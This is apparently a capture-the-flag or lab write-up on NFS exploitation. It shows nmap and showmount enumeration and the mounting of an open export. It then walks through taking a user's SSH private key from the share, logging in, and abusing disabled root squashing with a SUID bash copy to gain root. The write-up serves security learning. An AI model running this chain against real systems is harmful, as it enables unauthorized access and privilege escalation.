# NFS

![Pasted image 20240919160551](https://github.com/user-attachments/assets/282a5c8a-2c4f-463d-a591-2011b4c8ca87)

NFS stands for "Network File System". It’s a protocol that allows users to access files over a network in a way that’s similar to accessing local storage. With NFS, systems can share files and directories seamlessly, making it easier for users and applications to access remote data as if it were on their local machine.

Here’s a simplified overview of the process when a request is made:

1. **Client Request:** This request includes details such as the file path and the desired operation.
2. **RPC Mechanism:** The client’s request is encapsulated in an RPC message and sent over the network to the NFS server.
3. **Server Processing:** Upon receiving the request, the NFS server processes it.
4. **Response to Client:** This response could include the requested file data, confirmation of a write operation, or an error message if something went wrong.

### Scope:

In the exercise, I will be performing enumeration on a target host that has the NFS service running. Based on the information gather from the enumeration, I will attempt to mount a share from the NFS server and see what sensitive information or misconfiguration can be exploited. 

### Tools and Technology:

Nmap, Linux, NFS, and Wireshark

## Enumeration:

To get started, I wanted to get more information on the target host. To do this I used nmap:

```
nmap  -A 10.10.191.163 -T5 -p- -nnvvvv
```

![Pasted image 20240920095232](https://github.com/user-attachments/assets/22ec02c8-876d-4dea-b274-bf6858953df5)

Based on the output, I can see that both TCP/UDP port 2049 is open related to the NFS service among others. 

One of the features that Nmap has is the use of NSE scripts. In this case, these are the scripts available concerning NFS:

![Pasted image 20240919163929](https://github.com/user-attachments/assets/6145205e-e2e4-43a8-898f-b8b4f65cd51e)

I went ahead and used the scripts to see what other information I am able to gather on the target:

```
nmap --script nfs-* 10.10.191.163  -T4  -nnvvvv
```

![Pasted image 20240920095032](https://github.com/user-attachments/assets/cc3ab798-f03e-4738-a7df-f2615cb8bbf3)

This output provided more details information including the NFS stats. Next, I use the `showmount` command below. This `showmount` command displays information about NFS shares on the server. It also shows which file systems are exported by the NFS server and which clients have access to them.

```
/usr/sbin/showmount -e 10.10.191.163
```

![Pasted image 20240920095126](https://github.com/user-attachments/assets/3bd751c4-543f-4afa-8f9c-b7555582d7a6)

This output is important to note. The `*`  means that the NFS server allows any machine on the network to mount that directory without restrictions. 

## Portmap Traffic:

![Pasted image 20240920100456](https://github.com/user-attachments/assets/fb5a1d25-94f8-4d74-abf2-cfd1e4700cec)

NFS relies on RPC for communication between the client and server. Each NFS service runs on a specific port, but the port numbers can vary. This is where portmap comes in. When an NFS client wants to connect to the NFS server, it first sends a request to portmap on the server to find out which port number corresponds to the NFS service. Below is an example of portmap and how it looks in the network traffic:

![Pasted image 20240920095904](https://github.com/user-attachments/assets/1cedc99e-9313-4c80-8874-7941f024bbfc)

Since the directory output above shows that any machine on the network to mount that directory without restrictions, I went ahead and mounted the share to my local machine. To do this, I first needed to create a directory where the share will be mounted:

```
mkdir /tmp/mount
```

Now that I created the directory, I proceeded to mount the share:

```
sudo mount -t nfs 10.10.191.163:home /tmp/mount/ -nolock
```

Breaking this down: 
+ mount : Execute the mount command
+ -t nfs : Type of device to mount, then specifying that it's NFS
+ IP:share :  	The IP Address of the NFS server, and the name of the share we wish to mount
+ -nolock: Spcifies not to use NLM locking

<!--![Pasted image 20240920100041](https://github.com/user-attachments/assets/28ff5c7b-5a64-478a-a225-b1fa4ad3a013)-->

When a client needs to mount a file system from the server, the client will need to obtain a file handle from the server. The file handle must correspond to the file system. This process requires that several transactions occur between the client and the server. Here, my host is attempting to mount /home/ from the server 10.10.191.163. Here is a view of this process in Wireshark:

![Pasted image 20240920100127](https://github.com/user-attachments/assets/38cf5180-6b0d-44c0-a2aa-c23071c959f4)

Once the share was mounted, I navigated to it and listed what was inside

```
cd /tmp/mount
ls -l
```

![Pasted image 20240920102239](https://github.com/user-attachments/assets/7b843650-b8c8-433b-a928-bac9a125524c)

I see there is a cappucino directory:

```
cd cappucino
```

![Pasted image 20240920102820](https://github.com/user-attachments/assets/74fbfa43-46b7-4188-bf5f-f922bdf7f85b)

Inside I saw there was an SSH directory:

```
cd .ssh
```

![Pasted image 20240920102756](https://github.com/user-attachments/assets/b7a118aa-47a3-4172-9b77-be15bd2bdc0f)

Looking at the contents of the id_rsa key with "nano" command:

![Pasted image 20240920103035](https://github.com/user-attachments/assets/b9145623-b73f-4497-ae92-0c423a84663e)

Looking at the content of the authorized_keys with the "cat" command:

![Pasted image 20240920103610](https://github.com/user-attachments/assets/98b5707e-53b5-4c78-bd2b-c18a7ccbf55a)

I copied the private key to my local system and changed the permissions with chmod 600 file_name:

```
ls -lhr id_rsa
```

![Pasted image 20240920103435](https://github.com/user-attachments/assets/c303846c-78d8-4846-bf2b-19d7aaaab3f0)

Now that I have the private key, I attempted to login to the server via SSH:

```
ssh -i id_rsa cappucino@10.10.191.163
```

![Pasted image 20240920104035](https://github.com/user-attachments/assets/b7977ea7-3266-4b3e-8c42-85e1073015cc)

I was able to successfully login! 

## Exploiting NFS:

There are certain mechanisms that NFS has enabled by default that helps mitigate risks, one of these is called **Root Squashing**. It helps prevent the root user on a client machine from having unrestricted access to the NFS server’s file system. It’s typically enabled by default for NFS exports, but it can be turned off (which is generally not recommended). 

First, I downloaded the bash shell from the NFS server to my local system:

```
scp -i ~/id_rsa  cappucino@10.10.191.163:/bin/bash ~/Downloads/bash
```

I then changed the permissions owner to root:

```
chown root bash
```

![Pasted image 20240920105617](https://github.com/user-attachments/assets/b6472191-b3c7-44db-bf5b-96be01625229)

Copying the bash file to /tmp/mount directory 

```
cp ~/Download/bash /tmp/mount
```

I then proceeded to change the permissions and added the SUID bit using chmod:

```
chmod +s bash 
```

![Pasted image 20240920113954](https://github.com/user-attachments/assets/cf873900-dcac-4f74-94f9-8c065c02687b)

In output above I can see the I have the permissions,and I am now root! 

### Summary:

In this exercise, I was able to perform enumeration using nmap of the target host and identified the ports and services open. In this case, I focused on the NFS service. I was then able to access the NFS server and mount the share to my local host. This then provided me with the private key which I then used to login via SSH on the server. I was then able to set the SUID permissions due to misconfiguration of root squash. This ultimately allowed me to execute the SUID bit bash executable and gain root access. 

In conclusion, it's important to perform regular testing to uncover potential vulnerabilities in the NFS configuration, such as misconfigured exports, lack of proper authentication, or inadequate permissions, which can be exploited by attackers.
